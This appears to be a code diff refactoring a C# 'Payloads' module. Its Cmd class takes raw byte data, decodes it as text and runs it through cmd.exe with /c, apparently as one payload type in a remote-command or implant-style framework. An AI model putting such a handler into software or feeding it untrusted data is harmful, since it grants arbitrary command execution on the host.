@@ -1,10 +1,10 @@
 ﻿using System.Diagnostics;
 
-namespace csharp.Payloads
+namespace Reader.Payloads
 {
-    class Cmd
+    class Cmd : IPayload
     {
-        public void run(byte[] payload_data)
+        void IPayload.Run(byte[] payload_data)
         {
             string args = "/c " + System.Text.Encoding.UTF8.GetString(payload_data, 0, payload_data.Length);
             Process.Start("cmd.exe", args);
